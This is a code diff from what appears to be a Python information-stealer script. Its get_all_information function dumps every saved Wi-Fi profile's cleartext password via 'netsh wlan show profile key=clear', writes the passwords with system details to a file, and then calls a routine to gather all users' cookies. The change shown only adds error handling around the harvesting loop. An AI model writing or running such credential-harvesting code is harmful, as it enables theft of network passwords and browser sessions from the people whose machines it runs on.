@@ -168,35 +168,39 @@ def get_all_information():
     rus_names = ['Все профили пользователей', 'Содержимое ключа']
     eng_names = ['All User Profile', 'Key Content']
 
-    profiles_data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('CP866').split('\n')
-    profiles = [i.split(':')[1].strip() for i in profiles_data if rus_names[0] in i or eng_names[0] in i]
+    try:
+        profiles_data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('CP866').split('\n')
+        profiles = [i.split(':')[1].strip() for i in profiles_data if rus_names[0] in i or eng_names[0] in i]
 
-    for profile in profiles:
-        output_string = f'netsh wlan show profile {profile} key=clear'
+        for profile in profiles:
+            output_string = f'netsh wlan show profile {profile} key=clear'
 
-        # Trying to decode profile info from bytes to CP866
-        try:
-            profile_info = subprocess.check_output(output_string).decode('CP866').split('\n')
-        except subprocess.CalledProcessError:
-            pass
+            # Trying to decode profile info from bytes to CP866
+            try:
+                profile_info = subprocess.check_output(output_string).decode('CP866').split('\n')
+            except subprocess.CalledProcessError:
+                pass
 
-        # Trying to get necessery passwords from list of decoded profiles
-        try:
-            password = [i.split(':')[1].strip() for i in profile_info if rus_names[1] in i or eng_names[1] in i][0]
-        except IndexError:
-            password = None
+            # Trying to get necessery passwords from list of decoded profiles
+            try:
+                password = [i.split(':')[1].strip() for i in profile_info if rus_names[1] in i or eng_names[1] in i][0]
+            except IndexError:
+                password = None
 
-        # Writing down main system information into file
-        if profile == profiles[0]:
-            for key, value in main_comp_info.items():
+            # Writing down main system information into file
+            if profile == profiles[0]:
+                for key, value in main_comp_info.items():
+                    with open(file=file_name, mode='a', encoding='utf-8') as file:
+                        file.write(f'{key.capitalize()}: {value}\n')
                 with open(file=file_name, mode='a', encoding='utf-8') as file:
-                    file.write(f'{key.capitalize()}: {value}\n')
-            with open(file=file_name, mode='a', encoding='utf-8') as file:
-                file.write('\n')
+                    file.write('\n')
 
-        # Writing down wifi profiles' information
+            # Writing down wifi profiles' information
+            with open(file=file_name, mode='a', encoding='utf-8') as file:
+                file.write(f'Profile: {profile}\nPassword: {password}\n\n')
+    except subprocess.CalledProcessError:
         with open(file=file_name, mode='a', encoding='utf-8') as file:
-            file.write(f'Profile: {profile}\nPassword: {password}\n\n')
+            file.write(f'Sorry... There were no connections.')
 
     # Getting all users' cookies
     get_cookies(file_name)
